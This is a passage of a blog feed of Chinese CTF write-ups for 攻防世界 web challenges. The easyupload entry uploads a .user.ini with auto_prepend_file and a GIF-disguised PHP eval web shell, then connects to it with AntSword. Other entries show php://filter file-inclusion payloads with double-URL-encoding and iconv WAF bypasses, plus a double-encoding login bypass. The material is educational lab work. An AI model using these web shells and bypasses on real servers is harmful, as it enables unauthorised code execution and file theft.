    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>只是打了一点靶场，完全不够，知识还多着呢！</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li>尝试<br>首先进行多种尝试，修改php文件名后缀的方法几乎都试过了，无法上传成功。<br>图片木马多次尝试也无法成功。那么只能只能换一种思路。<br>几经波折后，我们发现了几个重要的点：</li></ol><ul><li>如果文件中含有php，那么无法上传成功，所以必须选择没有php的方式。这里可以使用短标签绕过。</li><li>即便上传了也无法连接蚁剑。那么我们可以选择尝试.user.ini</li></ul><p>这里涉及到几个知识：</p><ul><li><p>短标签<br>通常情况下输出我们会这样写：<br><code>&lt;?php echo &quot;hello&quot;; ?&gt;</code><br>但其实我们可以简写为: <code>&lt;?= &quot;hello&quot;;?&gt;</code></p></li><li><p>PHP REQUEST</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP 中提供了一个 $_REQUEST 全局变量，它是一个包含了 $_POST、$_GET 和 $_COOKIE 的数组，</span><br><span class="line">数组结构与 $_POST 和 $_GET 类似。</span><br><span class="line">也就是说不管是使用 POST 还是使用 GET 方式提交的数据，都可以使用 $_REQUEST 来获取，</span><br><span class="line">甚至可以使用 $_REQUEST 来获取 COOKIE 的信息。在 PHP5.3 中引入 request_order 属性，</span><br><span class="line">我们可以通过在 php.ini 配置文件中修改 request_order 属性的值，来控制 $_REQUEST 中包含的内容。</span><br></pre></td></tr></table></figure></li><li><p>.user.ini<br>.user.ini:它比.htaccess用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi运行的php都可以用这个方法。<br>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。<br>auto_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：<br><code>auto_prepend_file=123.gif</code><br>其中123.gif是需要包含的文件，借此我们可以包含任意文件。<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">更详细的解释</a></p></li><li><p>GIF89a<br>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年5月发行），但在Web上所见到的大多数图形都是以89a版的格式创建的。 89a版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。<br>示例：<br>在记事本下写下该内容，后缀保存为图片</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span> = <span class="string">&quot;refresh&quot;</span> <span class="attr">content</span> = <span class="string">&quot;1; url=http://www.***.com/&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当单独查看此文件时，会出现GIF89a，然后跳转到指定的网页（ie6和ie7下，Firefox下不可以）<br>php下检测（使用getimagesize函数无法判断其图片是无效的）</p></li></ul><ol start="2"><li><p>构造条件<br>涉及的知识都清楚后，我们先创建一个.user.ini文件，文件内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=c.jpg</span><br></pre></td></tr></table></figure><p>创建一个c.txt文件，文件内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=system(&#x27;cat /flag&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后将其后缀改为jpg</p></li><li><p>抓包修改<br>首先上传.user.ini文件，抓包<br>得到的包将里面的Content-Type改为image&#x2F;jpeg,放包<br>页面应显示： <code>file upload successful, the path is: uploads/.user.ini</code><br>然后上传c.jpg<br>页面应显示： <code>file upload successful, the path is: uploads/c.jpg</code><br>上传成功后便可进行下一步。</p></li><li><p>蚁剑连接<br>接下来我们打开F12，从Network处查看我们上传的文件地址：<br><code>http://61.147.171.105:56641/uploads/index.php</code><br>找到文件地址后，打开蚁剑连接<br>url地址填写上面的文件地址，连接密码则填写cmd<br>等待几秒，测试连接，一般会显示连接成功。<br>然后添加数据，等待几秒后，右键 文件管理。（有时蚁剑会出小问题，多尝试几次即可）<br>如果没有几个文件，删除重来。如果有很多文件，那么就可以从中找到我们所需的flag</p></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>慢慢来，不要忽略细节。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_56426046/article/details/126563269">攻防世界ctf题目easyupload做题笔记</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;只是打了一点靶场，完全不够，知识还多着呢！&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="upload" scheme="http://example.com/categories/CTF/upload/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="upload" scheme="http://example.com/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-baby_web</title>
    <link href="http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-baby_web/"/>
    <id>http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-baby_web/</id>
    <published>2022-12-13T16:00:00.000Z</published>
    <updated>2022-12-14T06:08:21.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也是一道非常简单的题目</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>看题<br>非常简单，就是要我们访问初始界面:index.php。<br>但问题是初始界面无法访问，总是会被重定向为:1.php。</p></li><li><p>抓包解决<br>既然在网页中不能访问初始界面，那么我们直接抓包。<br>抓包后送到Repeater，然后将1.php改为index.php，再send<br>之后即可在response中拿到flag</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;也是一道非常简单的题目&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="Web" scheme="http://example.com/categories/CTF/Web/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-file_include</title>
    <link href="http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/"/>
    <id>http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/</id>
    <published>2022-12-13T16:00:00.000Z</published>
    <updated>2022-12-14T17:40:13.440Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感觉挺开心的。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./check.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明显是文件包含，get型传参</p><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>首先按照标准的获取文件内容方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.base64-encode/resource=check.php</span><br></pre></td></tr></table></figure><p>执行后发现显示：do not hack!<br>这是配置了WAF，于是我们需要弄清楚哪里被过滤并且寻找绕过方式。</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>我们可以尝试在各个字段中添加1来破坏完整性，通过在ba1se64-en1code我们可知是base64和encode被过滤了。<br>于是需要想办法绕过base64和encode来达到目的。</p><h3 id="第1种方法"><a href="#第1种方法" class="headerlink" title="第1种方法"></a>第1种方法</h3><p><strong>二次编码URL绕过</strong><br>我们只需将as和nc连续编码两次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字符第1次第2次</span><br><span class="line">as %61%73%2561%2573</span><br><span class="line">nc %63%6f%2563%256f</span><br></pre></td></tr></table></figure><p>用第二次编码后的字符替换掉原来的字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.b%2561%2573e64-en%2563%256fde/resource=flag.php</span><br></pre></td></tr></table></figure><p>得到flag</p><h3 id="第2种方法"><a href="#第2种方法" class="headerlink" title="第2种方法"></a>第2种方法</h3><p><strong>convert.iconv.* 绕过</strong><br>这个过滤器需要php支持iconv，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。<br>iconv — 字符串按要求的字符编码来转换<br>convert.iconv.*的使用有两种方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line">or </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure><p>列举部分编码方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*UCS-4BE UCS-4LE*  UCS-2  UCS-2BE  </span><br><span class="line">UCS-2LE  UTF-32*  UTF-32BE*  UTF-32LE*  </span><br><span class="line">UTF-16*  UTF-16BE*  UTF-16LE*  UTF-7  </span><br><span class="line">UTF7-IMAP  UTF-8*  ASCII*  EUC-JP*  SJIS*</span><br><span class="line">eucJP-win*  SJIS-win*  ISO-2022-JP</span><br><span class="line">ISO-2022-JP-MS  CP932  CP51932  BASE64</span><br></pre></td></tr></table></figure><p>更多可参考<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a><br>经过多次尝试，最终找到了其中一种编码绕过方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>没有直接看答案做出的题还是让人蛮高兴的。又学习到了一点。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Zero_Adam/article/details/116170568">base64 的编码小trick</a><br><a href="https://blog.csdn.net/yuanxu8877/article/details/127607264">攻防世界web-file_include</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;感觉挺开心的。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-fileclude</title>
    <link href="http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileclude/"/>
    <id>http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileclude/</id>
    <published>2022-12-13T16:00:00.000Z</published>
    <updated>2022-12-14T12:06:55.106Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含的第一道ctf，之前也没练过，所以不知道怎么做。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>分析代码<br>打开后显示这样一段php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>];</span><br><span class="line">    <span class="variable">$file2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$file1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$file2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file2</span>) === <span class="string">&quot;hello ctf&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$file1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO&quot;</span>);</span><br></pre></td></tr></table></figure><p>看到php代码中的flag.php，我们直接在url后面加上，但是没有成功。<br>于是开始分析代码，可以看到要求以get方式传2个参数file1和file2。<br>file1的要求是非空，且被放入了include函数中。<br>file2放入了file_get_contents函数中，要求是全等于hello ctf<br>那么可以使用伪协议来读取flag.php源代码。</p></li><li><p>伪协议与解码<br>可使用的伪协议有很多种，这里仅演示我使用的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file1=php://filter/convert.base64-encode/resource=flag.php&amp;file2=data://text/plain,hello ctf</span><br></pre></td></tr></table></figure><p>得到一串base64编码的数据，只需解码即可得到flag</p></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>第一次做文件包含的题，仅仅是开始！</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_59057526/article/details/126747831">攻防世界-fileclude</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;文件包含的第一道ctf，之前也没练过，所以不知道怎么做。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界_PHP2</title>
    <link href="http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_PHP2/"/>
    <id>http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_PHP2/</id>
    <published>2022-12-13T16:00:00.000Z</published>
    <updated>2022-12-14T05:41:13.877Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一道很简单的题，但我因为基础不牢，导致做不出来。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>查看源码<br>首先页面显示没有意义的一句话。<br>然后我们点鼠标右键尝试查看源代码，无法看到。<br>于是尝试其它方式，比如在url后面加index.phps：<br><code>url/index.phps</code><br>源代码成功显示（用工具扫一下会比较好）</p></li><li><p>分析条件<br>我们看到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure><p>第1个if语句：要求不能直接在url栏输入admin，否则不予通过。<br>第2个if语句：url解码后的值要与admin相同。</p></li><li><p>构造语句<br>url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。<br>因此我们将a进行url编码，可得到%61dmin<br>解码后与admin值相同。<br>但这样还不够，因为url栏会先对传上的值解一次码，变成admin，这样在判断第1个if语句时仍然无法通过。<br>因此我们需要二次编码绕过。将%61再次进行编码：%2561<br>最终得到： <code>%2561dmin</code><br>最后拿到flag</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一道很简单的题，但我因为基础不牢，导致做不出来。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/categories/CTF/PHP/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
</feed>
